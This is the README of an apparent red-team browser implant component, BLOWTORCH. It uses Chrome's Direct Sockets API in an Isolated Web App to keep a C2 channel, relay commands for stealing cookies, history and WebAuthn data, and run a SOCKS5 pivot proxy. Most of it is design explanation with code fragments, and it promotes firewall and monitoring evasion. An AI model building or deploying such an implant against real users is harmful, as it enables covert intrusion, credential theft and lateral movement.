# BLOWTORCH - Isolated Web App Communication Hub

## Overview
BLOWTORCH is ChromeAlone's central communication component that serves as the bridge between the cloud C2 infrastructure, the Isolated Web App (IWA), and the HOTWHEELS Chrome extension. It leverages Chrome's experimental Direct Sockets API to enable sophisticated networking capabilities and cross-component communication within the browser.

## What is BLOWTORCH?

BLOWTORCH implements a three-part architecture responsible for:
1. **Cloud C2 Communications** - Establishes secure WebSocket connections to ChromeAlone's cloud C2 server for command and control
2. **IWA-Extension Bridge** - Provides a WebSocket server to enable communication between the BLOWTORCH IWA and HOTWHEELS Chrome extension  
3. **SOCKS Proxy Server** - Acts as a SOCKS proxy for traffic relayed from the cloud server, enabling full network pivoting capabilities

## Technical Deep Dive

### Understanding Chrome's Direct Sockets API

#### Traditional Browser Network Limitations

Historically, web browsers enforce strict networking restrictions:

**Same-Origin Policy**: 
- JavaScript can only make requests to the same origin (protocol + domain + port)
- Cross-origin requests require explicit server permission via CORS headers
- No access to raw TCP/UDP sockets from web content

**Network Isolation**:
- Web content cannot create listening servers
- No access to local network interfaces or low-level networking
- All communications must go through browser's networking stack

#### Direct Sockets API Revolution

Chrome's experimental Direct Sockets API breaks these traditional limitations:

**TCPServerSocket API**:
```javascript
const server = new TCPServerSocket('::');  // Listen on all interfaces
const {readable, localAddress, localPort} = await server.opened;
```

**TCPSocket API**:
```javascript
const socket = new TCPSocket(remoteAddress, remotePort);
const {readable, writable} = await socket.opened;
```

**Capabilities Enabled**:
- Create TCP server sockets that listen for incoming connections
- Establish outbound TCP connections to arbitrary hosts and ports
- Handle raw binary data streams
- Implement custom network protocols

#### Browser Context Advantages

Running networking code in the browser provides unique advantages:

**Firewall Bypass**:
- Browser traffic is typically allowed through corporate firewalls
- User-level firewall exceptions already exist for browser processes
- Network monitoring may not inspect browser-internal communications

**Persistence and Stealth**:
- Networking code runs within legitimate browser processes
- No separate network services to detect or monitor
- Can leverage browser's existing network authentication and proxies

### BLOWTORCH Architecture

#### Three-Part Communication System

BLOWTORCH operates as a central communication hub with three distinct responsibilities:

#### 1. Cloud C2 Communications (`src/socks-server.js`)

**Primary Responsibility**: Establishes and maintains secure WebSocket connections to ChromeAlone's cloud C2 server.

**Key Features**:
- Authenticates with cloud C2 using relay tokens
- Receives commands from operators via WebSocket protocol
- Routes commands to appropriate execution context (IWA or Extension)
- Implements automatic reconnection with exponential backoff
- Handles command types: `ls`, `shell`, `cookies`, `history`, `webauthn`

**Command Flow**:
```javascript
// Received from Cloud C2
{type: 'command', command: 'cookies', payload: {...}, taskId: 'task_123'}

// Routed to Extension via WebSocket Server  
{type: 'dump_cookies_request', data: {...}, taskId: 'task_123'}
```

#### 2. IWA-Extension Bridge (`src/websocket-server.js` - FirecrackerWebSocketServer)

**Primary Responsibility**: Enables communication between the BLOWTORCH IWA and HOTWHEELS Chrome extension.

**Key Features**:
- Runs WebSocket server on high port (default: 38899) using Direct Sockets API
- Accepts connections from HOTWHEELS extension
- Relays commands from C2 server to extension
- Forwards extension responses back to C2 server
- Supports message chunking for large data transfers
- Handles WebSocket protocol handshake and frame processing

**Communication Bridge**:
```javascript
// IWA receives command from C2
window.broadcastToFirecracker(JSON.stringify(commandObject));

// WebSocket server forwards to HOTWHEELS extension
await server.sendWebSocketMessage(connectionInfo, message);
```

#### 3. SOCKS Proxy Server (`src/socks-server.js`)

**Primary Responsibility**: Acts as a SOCKS5 proxy for network traffic relayed from the cloud server.

**Key Features**:
- Implements full SOCKS5 protocol compliance
- Handles IPv4, IPv6, and domain name address types
- Establishes direct TCP connections using Direct Sockets API
- Tunnels all SOCKS traffic through WebSocket connection to C2
- Enables network pivoting through compromised browser
- Supports connection multiplexing for concurrent sessions

#### Component Integration Flow

**Operational Flow**:

1. **Initialization** (`src/main.js`, `src/app.js`):
   - BLOWTORCH IWA starts and establishes WebSocket connection to cloud C2
   - FirecrackerWebSocketServer starts listening on port 38899
   - HOTWHEELS extension connects to FirecrackerWebSocketServer

2. **Command Execution**:
   - Cloud C2 sends command via WebSocket to BLOWTORCH
   - BLOWTORCH determines execution context (IWA vs Extension)
   - Commands requiring extension capabilities are forwarded via WebSocket server
   - Extension executes command and sends response back through the chain

3. **SOCKS Proxying**:
   - External tools connect to SOCKS proxy (when enabled)
   - SOCKS connections are tunneled through WebSocket to cloud C2
   - Cloud C2 establishes actual network connections and relays data
   - Bidirectional data flow enables full network pivoting

**Message Types Handled**:
- `command` - C2 commands for execution
- `form_data` - Captured form submissions
- `ls_command_response` - Directory listing results
- `shell_command_response` - Shell command output  
- `dump_cookies_response` - Browser cookie data
- `dump_history_response` - Browser history data
- `webauthn_response` - WebAuthn credential data

### Technical Implementation Details

#### WebSocket Communication Protocols

**C2 to IWA Protocol**:
BLOWTORCH uses WebSocket subprotocol with token authentication:
```javascript
const ws = new WebSocket(url.toString(), [`token.${this.relayToken}`]);
```

**IWA to Extension Protocol**:
FirecrackerWebSocketServer implements standard WebSocket handshake:
```javascript
// WebSocket handshake with proper Sec-WebSocket-Accept
const acceptKey = await this.generateAcceptKey(clientKey);
const response = [
    'HTTP/1.1 101 Switching Protocols',
    'Upgrade: websocket',
    'Connection: Upgrade',
    `Sec-WebSocket-Accept: ${acceptKey}`
].join('\r\n');
```

#### Message Chunking Support

For large data transfers, BLOWTORCH implements chunking:
```javascript
// Chunk start message
{type: 'chunk_start', chunkId: 'unique_id', totalSize: 1024000}

// Chunk data messages  
{type: 'chunk_data', chunkId: 'unique_id', chunkNum: 0, data: 'base64_data'}

// Chunk end message
{type: 'chunk_end', chunkId: 'unique_id', totalChunks: 10}
```

#### SOCKS Tunneling Protocol

**SOCKS Connection Multiplexing**:
```javascript
// Connection request to C2
{type: 'connect', connectionId: 'conn_123', targetHost: 'example.com', targetPort: 443}

// Data forwarding
{type: 'data', connectionId: 'conn_123', data: 'base64_encoded_payload'}

// Connection close
{type: 'close', connectionId: 'conn_123'}
```

### Direct Socket Security Implications

#### Bypassing Network Security Controls

**Firewall Evasion**:
- SOCKS proxy runs on high ports (often > 1024) that may be less monitored
- Traffic originates from browser process with legitimate network access
- Can tunnel arbitrary protocols through HTTP/WebSocket connections

**Network Monitoring Bypass**:
- Internal proxy traffic may not be logged by network monitoring
- Encrypted WebSocket tunnel obscures actual traffic patterns
- Browser networking stack may bypass some inspection tools

**Access Control Circumvention**:
- Can access internal network resources through compromised browser
- Bypasses application-level access controls
- Enables lateral movement through internal networks

#### Attack Scenarios

**Network Pivoting**:
```javascript
// Attacker configures their tools to use browser SOCKS proxy
// All traffic tunnels through compromised browser to internal network
const proxyConfig = {
    host: 'victim-browser-ip',
    port: 1080,  // BLOWTORCH SOCKS port
    type: 'socks5'
};
```

**Data Exfiltration**:
- Tunnel sensitive data through legitimate browser connections
- Bypass data loss prevention (DLP) systems
- Use browser's existing network authentication

**Internal Service Access**:
- Access internal web applications through browser's network context
- Bypass VPN requirements for internal resources
- Leverage browser's stored authentication credentials

### Isolated Web App (IWA) Integration

#### Understanding IWA Networking Privileges

Isolated Web Apps have enhanced networking capabilities:

**Extended Permissions**:
- Access to Direct Sockets API without user prompts
- Ability to listen on privileged ports (< 1024)
- Enhanced security context for networking operations

**Installation Persistence**:
- IWAs remain installed across browser updates
- Networking services survive browser restarts
- Can auto-start with browser launch

#### BLOWTORCH IWA Implementation

**Bundle Configuration**:
```json
{
  "name": "BLOWTORCH",
  "version": "1.0.0",
  "isolated": true,
  "permissions": [
    "direct-sockets"
  ]
}
```

**Enhanced Capabilities**:
- Persistent SOCKS proxy service
- No user prompts for network access
- Lower detection risk due to legitimate IWA status

## BLOWTORCH Capabilities

### Command and Control
- **Persistent C2 Channel** - Maintains encrypted WebSocket connection to cloud infrastructure
- **Automatic Reconnection** - Implements exponential backoff for connection resilience
- **Multi-Component Coordination** - Routes commands between IWA and extension contexts
- **Real-time Communication** - Bi-directional messaging for interactive operations

### Cross-Component Bridge  
- **IWA-Extension Communication** - WebSocket server enables HOTWHEELS extension integration
- **Message Broadcasting** - Distributes commands to all connected extension instances
- **Large Data Handling** - Chunking support for transferring substantial datasets
- **Protocol Translation** - Converts between C2 and extension message formats

### Network Pivoting
- **SOCKS5 Proxy Server** - Full-featured proxy server using Direct Sockets API
- **Internal Network Access** - Reach internal systems through compromised browser context
- **Connection Multiplexing** - Handle multiple concurrent SOCKS connections
- **Traffic Tunneling** - Encapsulate arbitrary network protocols over WebSocket

### Operational Features
- **Browser Integration** - Leverages browser's existing network authentication and proxies
- **Firewall Evasion** - Traffic appears as legitimate browser communications
- **Multi-Protocol Support** - Handles IPv4, IPv6, and domain name connections
- **Session Persistence** - Maintains long-lived channels for sustained operations